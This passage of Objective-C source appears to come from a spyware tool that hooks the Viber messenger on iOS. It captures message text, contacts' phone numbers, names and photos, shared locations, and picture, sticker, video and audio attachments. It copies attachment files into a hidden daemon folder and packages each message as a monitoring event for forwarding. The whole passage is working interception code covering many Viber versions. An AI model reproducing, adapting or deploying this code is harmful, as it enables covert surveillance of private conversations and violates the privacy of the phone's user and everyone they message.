         If user send outgoing audio (Hold & Talk), this method will be called for any Viber version; from Viber 5.2.0 and above
         there is no method attachment instead there is a new method attachments which returns NSOrderedSet that is not compatible
         type with below logic so we decide to add checking type before continue with below logic.
         
         Unrecognized selector exception is raised if we did not check type.
         
         We did not suport audio capture anyway!
         */
        
		if (compatibleType && ([result text] || [result attachment] != nil || [result cllocation] != nil)) {
			NSString *imServiceID = @"viber";
			NSString *userId = nil;
			NSString *userDisplayName = nil;
			NSData *userPhoto = nil;
			NSMutableArray *participants = [NSMutableArray array];
			NSString *message = [result text];
			NSString *convId = nil;
			NSString *convName = conv.name;
			NSData *convPhoto = nil;
			FxEventDirection direction = kEventDirectionUnknown;
			
			Class $UserDetailsManager = objc_getClass("UserDetailsManager");
			UserDetailsManager * userDetail = [$UserDetailsManager sharedUserDetailsManager];
			
			DLog(@"My photo path =  %@", [userDetail getMyUserPhotoPath]);
			NSData *myPhoto = [NSData dataWithContentsOfFile:[userDetail getMyUserPhotoPath]];
			
			if (isOutgoing) {
				userId = @"owner";
				userDisplayName = [userDetail getMyUserName];
				userPhoto = myPhoto;
				direction = kEventDirectionOut;
				
				id value = nil;
				NSEnumerator *enumerator = [conv.phoneNumIndexes objectEnumerator];
				while ((value = [enumerator nextObject])) {
					DLog(@"iconPath of participant = %@", [value iconPath]);
					NSData * participantIcon = [NSData dataWithContentsOfFile:[value iconPath]];
					
					FxRecipient *participant = [[FxRecipient alloc] init];
					[participant setRecipNumAddr:[value phoneNum]];
					[participant setMPicture:participantIcon];
					[participant setRecipContactName:[value name]];
					[participants addObject:participant];
					[participant release];
				}
				
				// Group chat there is a group id, 1-1 chat doesn't
				NSNumber *groupIDNum = [conv groupID];
				convId = [groupIDNum description];
				if(!groupIDNum) {
					FxRecipient *participant = [participants objectAtIndex:0];
					convId = [participant recipNumAddr];
					convPhoto = [participant mPicture];
				}
				
			} else {
				direction = kEventDirectionIn;
				
				FxRecipient *participant = [[FxRecipient alloc] init];
				[participant setRecipNumAddr:@"owner"];
				[participant setRecipContactName:[userDetail getMyUserName]];
				[participant setMPicture:myPhoto];
				[participants addObject:participant];
				[participant release];
				
				id value = nil;
				NSEnumerator *enumerator = [conv.phoneNumIndexes objectEnumerator];
				while ((value = [enumerator nextObject])) {
					DLog(@"iconPath of particpant = %@", [value iconPath]);
					
					TelephoneNumber *telephoneNumber = [[TelephoneNumber alloc] init];
					if([telephoneNumber isNumber:phoneNumber matchWithMonitorNumber:[value phoneNum]]) {
						userId = [value phoneNum];
						userDisplayName = [value name];
						userPhoto = [NSData dataWithContentsOfFile:[value iconPath]];
						
					} else {
						NSData * participantIcon = [NSData dataWithContentsOfFile:[value iconPath]];
						
						FxRecipient *participant = [[FxRecipient alloc] init];
						[participant setRecipNumAddr:[value phoneNum]];
						[participant setRecipContactName:[value name]];
						[participant setMPicture:participantIcon];
						[participants addObject:participant];
						[participant release];
					}
					[telephoneNumber release];
				}
				
				// Group chat there is a group id, 1-1 chat doesn't
				NSNumber *groupIDNum = [conv groupID];
				convId = [groupIDNum description];
				if(!groupIDNum) {
					convId = userId;
					convPhoto = userPhoto;
				}
			}
			

			DLog(@"[conv groupID]	= %@", [conv groupID]);
			DLog(@"userId			= %@", userId);
			DLog(@"userDisplayName	= %@", userDisplayName);
			DLog(@"userPhoto		= %@", [userPhoto class]);
			DLog(@"message			= %@", message);
			DLog(@"convId			= %@", convId);
			DLog(@"convName			= %@", convName);
			DLog(@"convPhoto		= %@", [convPhoto class]);
			DLog(@"direction		= %d", direction);
			for (FxRecipient *recipient in participants) {
				DLog(@"participantNumber		= %@", [recipient recipNumAddr])
				DLog(@"participantContactName	= %@", [recipient recipContactName])
				DLog(@"participantPhoto			= %@", [[recipient mPicture] class])
			}
			
			FxIMEvent *imEvent = [[FxIMEvent alloc] init];
			[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			[imEvent setMDirection:direction];
			[imEvent setMIMServiceID:imServiceID];
			[imEvent setMMessage:message];
			[imEvent setMRepresentationOfMessage:kIMMessageText];
			[imEvent setMUserID:userId];
			[imEvent setMUserDisplayName:userDisplayName];
			[imEvent setMUserPicture:userPhoto];
			[imEvent setMParticipants:participants];
			
			// New fields ...
			[imEvent setMServiceID:kIMServiceViber];
			[imEvent setMConversationID:convId];
			[imEvent setMConversationName:convName];
			[imEvent setMConversationPicture:convPhoto];
			
			// ===== OUTGOING
			if (isOutgoing) {
				//------- Capture User Location
				if([result location]!=nil && [[result text]length]== 0 && [result attachment ]== nil){
					DLog(@"***** sharelocation %@",[result location]);
					[imEvent setMRepresentationOfMessage:kIMMessageShareLocation];
					ViberLocation * viberLocation = [result location];
					FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
					[location setMLongitude:[[viberLocation longitude]floatValue]];
					[location setMLatitude:[[viberLocation latitude]floatValue]];			
					DLog (@"hor accu %@", [viberLocation horizontalAccuracy]);
					DLog (@"Viber location address = %@", [viberLocation address]);
					DLog (@"Viber message address = %@", [result address]);
					float hor = -1;						// Default value when cannot get information	
					if ([viberLocation horizontalAccuracy])
						hor	= [[viberLocation horizontalAccuracy] floatValue];
					[location setMHorAccuracy:hor];
					[location setMPlaceName:[viberLocation address]];
					[imEvent setMShareLocation:location];
					[location release];
				}
				// ------- Capture User Location
				else {
					if([result location]!=nil){
						DLog(@"***** Usersharelocation %@",[result location]);
						ViberLocation * viberLocation = [result location];
						FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
						[location setMLongitude:[[viberLocation longitude]floatValue]];
						[location setMLatitude:[[viberLocation latitude]floatValue]];
						DLog (@"hor accu %@", [viberLocation horizontalAccuracy]);
						DLog (@"Viber location address = %@", [viberLocation address]);
						DLog (@"Viber message address = %@", [result address]);
						float hor = -1;						// Default value when cannot get information	
						if ([viberLocation horizontalAccuracy])
							hor	= [[viberLocation horizontalAccuracy] floatValue];					
						[location setMHorAccuracy:hor];
						[location setMPlaceName:[viberLocation address]];
						[imEvent setMUserLocation:location];
						[location release];
					}
				}
				
				// ------- Capture outgoing Attachment
				if([result attachment]!= nil){
					DLog(@"************************ Attachment");
					NSString* filepath = [attachment path];
					NSError * error = nil;
					
                    logAttachment(attachment);
                    
					if([[attachment type]isEqual:@"sticker"]){
						
						NSAutoreleasePool *stickerPool = [[NSAutoreleasePool alloc] init];
						
						[imEvent setMRepresentationOfMessage:kIMMessageSticker];
						
						Class $StickersManager = objc_getClass("StickersManager");
						StickersManager * stickerManager = [$StickersManager sharedStickersManager];
						
						DLog(@"stickerDataCache %@",[stickerManager stickerDataCache]);
						
						NSNumber * number = [[NSNumber alloc]initWithInt:[[attachment ID]intValue]];
						
						NSMutableDictionary * stickerDataCache = [stickerManager stickerDataCache];
						
						StickerData *stickerData = [stickerDataCache objectForKey:number];
						[number release];
						
						DLog(@"imagePath %@",[stickerData imagePath]);
						
						NSData * sticker = [NSData dataWithContentsOfFile:[stickerData imagePath]];
						
						NSMutableArray *attachments = [[NSMutableArray alloc] init];
						FxAttachment *attachment = [[FxAttachment alloc] init];	
						[attachment setMThumbnail:sticker];
						[attachments addObject:attachment];			
						[attachment release];
						
						[imEvent setMAttachments:attachments];
						[attachments release];
						
						[stickerPool release];
					}
					else if([[attachment type]isEqual:@"picture"]){
						NSFileManager *fileManager = [NSFileManager defaultManager];
						
						DLog(@"***=================== exist %d",[fileManager fileExistsAtPath:filepath]);
						
						NSString* imViberAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
						NSString *saveFilePath = [NSString stringWithFormat:@"%@%f%@",imViberAttachmentPath,[[result date] timeIntervalSince1970],[attachment name]];
						
						if ([fileManager fileExistsAtPath:filepath]){ 
							//=========> Fix msg just delete it if cause error
							if([[result text]length]==0){
								[imEvent setMRepresentationOfMessage:kIMMessageNone];
							}
							//=========> Fix msg just delete it if cause error
							
							[fileManager copyItemAtPath:filepath toPath:saveFilePath error:&error];
							
							NSData * thum = [NSData dataWithContentsOfFile:[attachment previewPath]];
							
							NSMutableArray *attachments = [[NSMutableArray alloc] init];
							FxAttachment *attachment = [[FxAttachment alloc] init];	
							[attachment setFullPath:saveFilePath];
							[attachment setMThumbnail:thum];
							[attachments addObject:attachment];			
							[attachment release];
							
							[imEvent setMAttachments:attachments];
							[attachments release];
						}else{
							NSAutoreleasePool *photoAlbumPool = [[NSAutoreleasePool alloc] init];
							// Attachment photo which select from photo album
							Class $PLPhotoLibrary = objc_getClass("PLPhotoLibrary");
							NSURL *url = [NSURL URLWithString:[attachment url]];
							PLPhoto *photo = [[$PLPhotoLibrary sharedPhotoLibrary] photoFromAssetURL:url];
							NSString *pathToPhotoAlbum = [photo pathForOriginalFile];
							DLog(@"pathToPhotoAlbum = %@", pathToPhotoAlbum);
							
							if (pathToPhotoAlbum != nil){
								// Copy at daemon part...
								[imEvent setMMessageIdOfIM:@"outgoing photo from album"];
								[imEvent setMOfflineThreadId:pathToPhotoAlbum];	
								
								NSData * thum = [NSData dataWithContentsOfFile:[attachment previewPath]];
								
								NSMutableArray *attachments = [[NSMutableArray alloc] init];
								FxAttachment *attachment = [[FxAttachment alloc] init];	
								[attachment setFullPath:saveFilePath];
								[attachment setMThumbnail:thum];
								[attachments addObject:attachment];
								[attachment release];
								
								[imEvent setMAttachments:attachments];
								[attachments release];
							} else {
                                
                                NSData * thumbnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
								
                                if ([thumbnail length] > 0) {
                                    DLog(@"***=================== Picture data lost but thumbnail OK");
                                    
                                    NSMutableArray *attachments = [[NSMutableArray alloc] init];
                                    FxAttachment *attachment = [[FxAttachment alloc] init];
                                    [attachment setFullPath:nil];
                                    [attachment setMThumbnail:thumbnail];
                                    [attachments addObject:attachment];
                                    [attachment release];
                                    
                                    [imEvent setMAttachments:attachments];
                                    [attachments release];
                                    
                                } else {
                                    DLog(@"***=================== Data Lost %@", pathToPhotoAlbum);
                                }
							}
							[photoAlbumPool release];
						}
					}
					else if([[attachment type]isEqual:@"video"]){
						//=========> Fix msg just delete it if cause error
						if([[result text]length]==0){
							[imEvent setMRepresentationOfMessage:kIMMessageNone];
						}
						//=========> Fix msg just delete it if cause error
						if([attachment url]!= nil){
							
							NSAutoreleasePool *videoPool = [[NSAutoreleasePool alloc] init];
							
							Class $PLPhotoLibrary = objc_getClass("PLPhotoLibrary");
							NSURL *url = [NSURL URLWithString:[attachment url]];
							PLPhoto *photo = [[$PLPhotoLibrary sharedPhotoLibrary] photoFromAssetURL:url];
							NSString *path = [photo pathForOriginalFile];
							DLog(@"path = %@",path);
							
							NSString *imViberAttachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
							NSString *saveFilePath = [NSString stringWithFormat:@"%@%f%@",imViberAttachmentPath,[[result date] timeIntervalSince1970],[path lastPathComponent]];
							
							// Copy at daemon part...
							[imEvent setMMessageIdOfIM:@"outgoing video"];	// help to indicate that this is video file
							[imEvent setMOfflineThreadId:path];				// help to store video file path in photo library
							
							NSData * videoThumbnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
							
							NSMutableArray *attachments = [[NSMutableArray alloc] init];
							FxAttachment *fxattachment = [[FxAttachment alloc] init];	
							[fxattachment setMThumbnail:videoThumbnail];
							[fxattachment setFullPath:saveFilePath];
							[attachments addObject:fxattachment];
							[fxattachment release];
							
							[imEvent setMAttachments:attachments];
							[attachments release];
							
							[videoPool release];
						}else{
							// Waiting for attachment fill asset url in database
							waiting = YES;
						}
					} else if ([[attachment type] isEqualToString:@"audio"]) { // Hold & Talk (from Viber 4.0 up)
						NSFileManager *fileManager = [NSFileManager defaultManager];
						
						DLog(@"***=================== exist %d",[fileManager fileExistsAtPath:filepath]);
						
						NSString* imViberAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
						NSString *saveFilePath = [NSString stringWithFormat:@"%@%f%@",imViberAttachmentPath,[[result date] timeIntervalSince1970],[attachment name]];
						
						if ([fileManager fileExistsAtPath:filepath]){ // Not support yet (since file path is wrong as well as format of audio)
							//=========> Fix msg just delete it if cause error
							if([[result text]length]==0){
								[imEvent setMRepresentationOfMessage:kIMMessageNone];
							}
							//=========> Fix msg just delete it if cause error
							
							[fileManager copyItemAtPath:filepath toPath:saveFilePath error:&error];
							
							NSMutableArray *attachments = [[NSMutableArray alloc] init];
							FxAttachment *attachment = [[FxAttachment alloc] init];
							[attachment setFullPath:saveFilePath];
							[attachment setMThumbnail:nil];
							[attachments addObject:attachment];
							[attachment release];
							
							[imEvent setMAttachments:attachments];
							[attachments release];
						} else {
                            // Viber 4.2 saved file audio files in Documents/VoiceMessages/x where x is file name, after audio file is uploaded to its server
                            // path: /var/mobile/Applications/ECA01247-0B69-40EE-B7AF-7EDE892E5829/Documents/Attachments/11
                            
                            DLog(@"/* Not support audio attachment (Hold & Talk) */");
                        }
					}
						
				}
				
				[ViberUtils sendViberEvent:imEvent
								Attachment:attachment
							  viberMessage:result
								shouldWait:waiting
							 downloadVideo:NO];
				
			} else { // INCOMING
				// ------- Capture User Location
				if([result location]!= nil && ![[attachment type]isEqual:@"customLocation"] ){
					DLog(@"***** Usersharelocation %@",[result location]);
					ViberLocation * viberLocation = [result location];
					FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
					[location setMLongitude:[[viberLocation longitude]floatValue]];
					[location setMLatitude:[[viberLocation latitude]floatValue]];
					DLog (@"hor accu %@", [viberLocation horizontalAccuracy]);
					DLog (@"Viber location address = %@", [viberLocation address]);
					DLog (@"Viber message address = %@", [result address]);
					float hor = -1;						// Default value when cannot get information	
					if ([viberLocation horizontalAccuracy])
						hor	= [[viberLocation horizontalAccuracy] floatValue];
					[location setMHorAccuracy:hor];
					[location setMPlaceName:[viberLocation address]];
					[imEvent setMUserLocation:location];
					[location release];
				}
				
				// ------- Capture Incoming Attachment
				if([result attachment]!= nil){
					DLog(@"************************ Attachment");
					
                    logAttachment(attachment);
					
					if([[attachment type]isEqual:@"sticker"]){
						
						NSAutoreleasePool *stickerPool = [[NSAutoreleasePool alloc] init];
						
						[imEvent setMRepresentationOfMessage:kIMMessageSticker];
						
						Class $StickersManager = objc_getClass("StickersManager");
						StickersManager * stickerManager = [$StickersManager sharedStickersManager];
						
						DLog(@"stickerDataCache %@",[stickerManager stickerDataCache]);
						
						NSNumber * number = [[NSNumber alloc]initWithInt:[[attachment ID]intValue]];
						
						NSMutableDictionary * stickerDataCache = [stickerManager stickerDataCache];
						
						StickerData *stickerData = [stickerDataCache objectForKey:number];
						[number release];
						
						DLog(@"imagePath %@",[stickerData imagePath]);
						
						NSData * sticker = [NSData dataWithContentsOfFile:[stickerData imagePath]];
						
						NSMutableArray *attachments = [[NSMutableArray alloc] init];
						FxAttachment *attachment = [[FxAttachment alloc] init];	
						[attachment setMThumbnail:sticker];
						[attachments addObject:attachment];			
						[attachment release];
						
						[imEvent setMAttachments:attachments];
						[attachments release];
						
						[stickerPool release];
					} else if([[attachment type]isEqual:@"picture"]){
						
						NSString* filepath = [attachment previewPath];
						DLog(@"***=================== previewPath %@",filepath);
						NSFileManager *fileManager = [NSFileManager defaultManager];
						
						DLog(@"***=================== exist %d",[fileManager fileExistsAtPath:filepath]);
						
						//=========> Fix msg just delete it if cause error
						if([[result text]length]==0){
							[imEvent setMRepresentationOfMessage:kIMMessageNone];
						}
						//=========> Fix msg just delete it if cause error
						
						NSMutableArray *attachments = [[NSMutableArray alloc] init];
						FxAttachment *fxattachment	= [[FxAttachment alloc] init];												
						// -- Check if thumbnail data exist or not
						if ([fileManager fileExistsAtPath:filepath]){ 	
							NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
							
							// -- get thumbnail data
							NSData * incomingattactment = [NSData dataWithContentsOfFile:[attachment previewPath]];					
							[fxattachment setMThumbnail:incomingattactment];			// -- thumbnail
							
							[pool release];
						} else{
							DLog(@"***=================== Photo Thumbnail Lost %@",filepath);																				
						}				
						[fxattachment setFullPath:@"image/jpeg"];						// -- mime type
						[attachments addObject:fxattachment];			
						[fxattachment release];				
						[imEvent setMAttachments:attachments];
						[attachments release];					
					}else if([[attachment type]isEqual:@"video"]){
						//=========> Fix msg just delete it if cause error
						if([[result text]length]==0){
							[imEvent setMRepresentationOfMessage:kIMMessageNone];
						}
						//=========> Fix msg just delete it if cause error
						downloadVideo = YES;
					}else if([[attachment type]isEqual:@"customLocation"]){	// Capture Shared Location
						DLog(@"***** sharelocation %@",[result location]);
						[imEvent setMRepresentationOfMessage:kIMMessageShareLocation];
						ViberLocation * viberLocation = [result location];
						FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
						[location setMLongitude:[[viberLocation longitude]floatValue]];
						[location setMLatitude:[[viberLocation latitude]floatValue]];
						DLog (@"hor accu %@", [viberLocation horizontalAccuracy]);
						DLog (@"Viber location address = %@", [viberLocation address]);
						DLog (@"Viber message address = %@", [result address]);
						float hor = -1;						// Default value when cannot get information	
						if ([viberLocation horizontalAccuracy])
							hor	= [[viberLocation horizontalAccuracy] floatValue];
						[location setMHorAccuracy:hor];
						[location setMPlaceName:[viberLocation address]];
						[imEvent setMShareLocation:location];
						[location release];	
					}
				}
				
				[ViberUtils sendViberEvent:imEvent
								Attachment:attachment
							  viberMessage:result
								shouldWait:NO
							 downloadVideo:downloadVideo];
			}
			
			[imEvent release];
		}
		
		dbManager = nil;
	}
	@catch (NSException * e) {
		DLog (@"Thread exception = %@", e);
	}
	@finally {
		;
	}
	DLog (@"Thread 31 is exiting")
	[aArray release];
	[pool release];
	DLog (@"Thread 31 is exited")
}

#pragma mark -
#pragma mark Viber 4.0, 4.2, 5.0, 5.1, 5.2, 5.3,6.1.5,6.2.1
#pragma mark -

+ (void) captureIncomingViberEvent: (ViberMessage *) aViberMessage
					withPLTMessage: (PLTMessage *) aPLTMessage {
	ViberMessage *result = aViberMessage;
	id attachmentObj = nil;
    if ([result respondsToSelector:@selector(attachment)]) { // Below 5.2.0
        attachmentObj = [result attachment]; // Attachment
    } else if ([result respondsToSelector:@selector(attachments)]) { // 5.2.0 and above
        if ([[result attachments] count] > 0) {
            attachmentObj = [result attachments]; // NSOrderedSet
        }
    }
    
    DLog(@"attachmentObj : [%@] %@", [attachmentObj class], attachmentObj);
    
    id userDetailsManager = nil;
	
	Class $UserDetailsManager = objc_getClass("UserDetailsManager");        // Before 5.2.2
	UserDetailsManager * userDetail = [$UserDetailsManager sharedUserDetailsManager];
    userDetailsManager = userDetail;
    
    // In Viber 5.2.2 onward, UserDetailsManager class was replaced by VIBUserDetailsManager
    if (!userDetailsManager) {
        Class $VIBUserDetailsManager = objc_getClass("VIBUserDetailsManager");        // Viber 5.2.2
        VIBUserDetailsManager *vibUserDetail = [$VIBUserDetailsManager sharedVIBUserDetailsManager];
        userDetailsManager = vibUserDetail;
    }
	
	DLog(@"MyUserPhotoPath %@",[userDetailsManager getMyUserPhotoPath]);
	NSData *myPhoto = [NSData dataWithContentsOfFile:[userDetailsManager getMyUserPhotoPath]];
    
    if (!myPhoto) {
        UIImage *owner = [userDetailsManager getMyUserPhoto];
        if (owner)
            myPhoto = UIImagePNGRepresentation(owner);
    }

	BOOL downloadVideo = NO;
	
	if ([result text] || attachmentObj != nil || [result cllocation] != nil) {
		NSString *imServiceID = @"viber";
		NSString *userId = nil;
		NSString *userDisplayName = nil;
		NSMutableArray *participants = [NSMutableArray array];
		NSString *message = [result text];
		NSString *convId = nil;
		NSString *convName = nil;
		NSData *senderPhoto = nil;
		
		Conversation *conv = result.conversation;
		convName = conv.name;
		NSEnumerator *enumerator = [conv.phoneNumIndexes objectEnumerator];
		id value = nil;
		
		PhoneNumberIndex *userPhoneNumberIndex = [result phoneNumIndex]; // Object of Member in 6.2.1
		DLog (@"--------------------- PhoneNumberIndex ---------------------")
        DLog (@"userPhoneNumberIndex= %@", [userPhoneNumberIndex class])
		DLog (@"name				= %@", [userPhoneNumberIndex name])
		DLog (@"shortName			= %@", [userPhoneNumberIndex shortName])
		DLog (@"accessibleName		= %@", [userPhoneNumberIndex performSelector:@selector(accessibleName)])
		DLog (@"accessibleShortName	= %@", [userPhoneNumberIndex performSelector:@selector(accessibleShortName)])
		DLog (@"iconState			= %@", [userPhoneNumberIndex iconState])
		DLog (@"iconPath			= %@", [userPhoneNumberIndex iconPath])
        if ([userPhoneNumberIndex respondsToSelector:@selector(canonizedPhoneNum)]) {
            DLog (@"canonizedPhoneNum	= %@", [userPhoneNumberIndex canonizedPhoneNum])
        }
        if ([userPhoneNumberIndex respondsToSelector:@selector(phoneNum)]) {
            DLog (@"phoneNum			= %@", [userPhoneNumberIndex phoneNum])
        }
        if ([userPhoneNumberIndex respondsToSelector:@selector(phoneNumbers)]) {
            DLog (@"phoneNumbers        = %@", [(Member *)userPhoneNumberIndex phoneNumbers])
        }
        if ([userPhoneNumberIndex respondsToSelector:@selector(anyPhoneNumber)]) {
            DLog (@"anyPhoneNumber      = %@", [(Member *)userPhoneNumberIndex anyPhoneNumber])
        }
		DLog (@"--------------------- PhoneNumberIndex ---------------------")
        
        NSString *userPhoneNum = nil;
        if ([userPhoneNumberIndex respondsToSelector:@selector(phoneNum)]) {
            userPhoneNum = [userPhoneNumberIndex phoneNum];
        } else if ([userPhoneNumberIndex respondsToSelector:@selector(anyPhoneNumber)]) {
            userPhoneNum = [(Member *)userPhoneNumberIndex anyPhoneNumber];
        }
		
		FxRecipient *participant = [[FxRecipient alloc] init];
		[participant setRecipNumAddr:@"owner"];
		[participant setRecipContactName:[userDetailsManager getMyUserName]];
		[participant setMPicture:myPhoto];
		[participants addObject:participant];
		[participant release];
        //DLog(@"phoneNumIndexes : [%@] %@", [conv.phoneNumIndexes class], conv.phoneNumIndexes);
		while ((value = [enumerator nextObject])) {
            //DLog(@"value : %@", value);
            NSString *phoneNum = nil;
            if ([value respondsToSelector:@selector(phoneNum)]) {
                phoneNum = [value phoneNum];
            } else if ([value respondsToSelector:@selector(anyPhoneNumber)]) { // 6.2.1
                phoneNum = [(Member *)value anyPhoneNumber];
            }
            
			TelephoneNumber *telephoneNumber = [[TelephoneNumber alloc] init];
			if([telephoneNumber isNumber:userPhoneNum matchWithMonitorNumber:phoneNum]) {
				userDisplayName = [value name];
                userId = phoneNum;
				senderPhoto = [NSData dataWithContentsOfFile:[value iconPath]];
			} else {
				DLog(@"********* iconPath %@", [value iconPath]);
				NSData * participantIcon = [NSData dataWithContentsOfFile:[value iconPath]];
				FxRecipient *participant = [[FxRecipient alloc] init];
				[participant setRecipNumAddr:phoneNum];
				[participant setRecipContactName:[value name]];
				[participant setMPicture:participantIcon];
				[participants addObject:participant];
				[participant release];
			}
			[telephoneNumber release];
		}
		// group chat there is a group id, 1-1 chat doesn't
		NSNumber *groupIDNum = [conv groupID];
		convId = [groupIDNum description];
		if(!groupIDNum) {
			convId = userId;
		}
		DLog(@"groupIDNum = %@", [conv groupID]);
		DLog(@"mUserID %@", userId);
		DLog(@"mUserDisplayName %@", userDisplayName);
		for (FxRecipient *recipient in participants) {
			DLog(@"mRecipient %@", [NSString stringWithFormat:@"%@ %@",[recipient recipNumAddr], [recipient recipContactName]]);
		}
		DLog(@"mMessage %@", message);
		DLog(@"mConversationID %@", convId);
		DLog(@"mConversationName %@", convName);
		
		FxIMEvent *imEvent = [[FxIMEvent alloc] init];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[imEvent setMUserID:userId];
		[imEvent setMDirection:kEventDirectionIn];
		[imEvent setMIMServiceID:imServiceID];
		[imEvent setMMessage:message];
		[imEvent setMRepresentationOfMessage:kIMMessageText];
		[imEvent setMUserDisplayName:userDisplayName];
		[imEvent setMParticipants:participants];
		[imEvent setMUserPicture:senderPhoto];
		
		// New fields ...
		[imEvent setMServiceID:kIMServiceViber];
		[imEvent setMConversationID:convId];
		[imEvent setMConversationName:convName];
        
        NSArray *attachments = nil;
        Class $Attachment = objc_getClass("Attachment");
        Class $NSOrderedSet = objc_getClass("NSOrderedSet");
        
        if ([attachmentObj isKindOfClass:$Attachment]) {
            attachments = [NSArray arrayWithObject:attachmentObj];
        } else if ([attachmentObj isKindOfClass:$NSOrderedSet]) {
            attachments = [(NSOrderedSet *)attachmentObj array];
        }
		
		//Capture User Location
        for (Attachment *attachment in attachments) {
            if( [result location]!= nil && ![[attachment type]isEqual:@"customLocation"] ){
                DLog(@"***** Usersharelocation %@",[result location]);
                ViberLocation * viberLocation = [result location];
                FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
                [location setMLongitude:[[viberLocation longitude]floatValue]];
                [location setMLatitude:[[viberLocation latitude]floatValue]];
                DLog (@"hor accu %@", [viberLocation horizontalAccuracy]);
                DLog (@"Viber location address = %@", [viberLocation address]);
                DLog (@"Viber message address = %@", [result address]);
                float hor				= -1;						// default value when cannot get information	
                if ([viberLocation horizontalAccuracy])
                    hor					= [[viberLocation horizontalAccuracy] floatValue];
                [location setMHorAccuracy:hor];
                [location setMPlaceName:[viberLocation address]];
                [imEvent setMUserLocation:location];
                [location release];
            }
        }
		
        NSMutableArray *fxAttachments = [NSMutableArray array];
        
		// Capture Incoming Attachment
        for (Attachment *attachment in attachments) {
            if(attachment != nil){
                DLog(@"************************ Attachment");
                DLog(@"***=================== type %@",[attachment type]);
                
                DLog(@"*** =================== type %@",[attachment type]);
                DLog(@"*** =================== ID %@",[attachment ID]);
                DLog(@"*** =================== bucket %@",[attachment bucket]);
                DLog(@"*** =================== path %@",[attachment path]);
                DLog(@"*** =================== previewPath %@",[attachment previewPath]);
                DLog(@"*** =================== name %@",[attachment name]);
                DLog(@"*** =================== duration %@",[attachment duration]);
                if ([attachment respondsToSelector:@selector(urlToContent)]) { // Below 5.6.5
                    DLog(@"*** =================== urlToContent %@",[attachment urlToContent]);
                }
                DLog(@"*** =================== url %@",[attachment url]);
                
                if([[attachment type]isEqual:@"sticker"]){
                    [imEvent setMRepresentationOfMessage:kIMMessageSticker];
                    
                    Class $StickersManager      = objc_getClass("StickersManager");
                    Class $VIBStickersManager    = objc_getClass("VIBStickersManager");   // Viber 5.2.2
                    Class $VIBStickerData = objc_getClass("VIBStickerData");
                    
                    //StickersManager * stickerManager = [$StickersManager sharedStickersManager];
                    id stickerManager           =       nil;
                    if ($StickersManager) {
                        stickerManager          = [$StickersManager sharedStickersManager];
                    } else {
                        stickerManager          = [$VIBStickersManager sharedVIBStickersManager];
                    }
                    
                    NSNumber * number = [[NSNumber alloc]initWithInt:[[attachment ID]intValue]];
                    
                    NSMutableDictionary * stickerDataCache = nil;
                    if ([stickerManager respondsToSelector:@selector(stickerDataCache)]) {
                        stickerDataCache = [stickerManager stickerDataCache];
                    } else {
                        // 5.5.0
                        object_getInstanceVariable(stickerManager, "_stickerDataCache", (void **)&stickerDataCache);
                    }
                    DLog(@"stickerDataCache %@", stickerDataCache);
                    
                    id stickerData = nil;
                    if (stickerDataCache) {
                        stickerData = [stickerDataCache objectForKey:number];  // The class can be StickerData or VIBStickerData
                    } else {
                        stickerData = [stickerManager stickerDataForID:number]; //  VIBStickerData for 5.4.0
                    }
                    
                    DLog(@"imagePath	= %@",[stickerData imagePath]);
                    DLog(@"lowResImage	= %@",[stickerData performSelector:@selector(lowResImage)]);
                    DLog(@"outlinePath	= %@",[stickerData outlinePath]);
                    if ([stickerData respondsToSelector:@selector(outlineImage)]) {
                        DLog(@"outlineImage	= %@",[stickerData outlineImage]);
                    }
                    DLog(@"stickerID	= %@",[stickerData stickerID]);
                    DLog(@"downloadStatus = %d",[stickerData downloadStatus]);
                    DLog(@"stickerData	= %@",stickerData);
                    
                    NSData * sticker = nil;
                    if ([[stickerData imagePath] length] > 0) {
                        sticker = [NSData dataWithContentsOfFile:[stickerData imagePath]];
                        if (!sticker) {
                            if ([stickerData isKindOfClass:$VIBStickerData]) {
                                // 5.5.0
                                sticker = [self stickerDataWithSticker:stickerData];
                            }
                        }
                    } else {
                        // Sticker is not in the cache
                        if ([stickerManager respondsToSelector:@selector(stickerWithID:)]) { // <= 4.0
                            stickerData = [stickerManager stickerWithID:number];
                        } else if ([stickerManager respondsToSelector:@selector(stickerDataForID:)]) { // > 4.0
                            stickerData = [stickerManager stickerDataForID:number];
                        }
                        DLog(@"stickerData from StickerManager = %@",stickerData);
                        sticker = [NSData dataWithContentsOfFile:[stickerData imagePath]];
                        
                        if (![sticker length]) {
                            NSInteger attempt = 3;
                            while (![stickerData downloadStatus]  && attempt > 0) {
                                DLog(@"Wait for sticker to be loaded")
                                [NSThread sleepForTimeInterval:1.5];
                                attempt--;
                            }
                            sticker = [NSData dataWithContentsOfFile:[stickerData imagePath]];
                            DLog(@"sticker data %lu", (unsigned long)[sticker length])
                            
                            if (![sticker length]) {
                                if ([stickerData isKindOfClass:$VIBStickerData]) {
                                    // 5.5.0
                                    sticker = [self stickerDataWithSticker:stickerData];
                                }
                            }
                        }
                        
                    }
                    [number release];
                    
                    NSMutableArray *attachments = [[NSMutableArray alloc] init];
                    FxAttachment *attachment = [[FxAttachment alloc] init];	
                    [attachment setMThumbnail:sticker];
                    [attachments addObject:attachment];
                    [fxAttachments addObject:attachment];
                    [attachment release];
                    
                    [imEvent setMAttachments:attachments];
                    [attachments release];
                }
                else if([[attachment type]isEqual:@"picture"]){
                    
                    NSString* filepath = [attachment previewPath];
                    DLog(@"***=================== previewPath %@",filepath);
                    NSFileManager *fileManager = [NSFileManager defaultManager];
                    
                    DLog(@"***=================== exist %d",[fileManager fileExistsAtPath:filepath]);
                    
                    //=========Fix msg just delete it if cause error
                    if([[result text]length]==0){
                        [imEvent setMRepresentationOfMessage:kIMMessageNone];
                    }
                    //=========Fix msg just delete it if cause error
                    
                    NSMutableArray *attachments = [[NSMutableArray alloc] init];
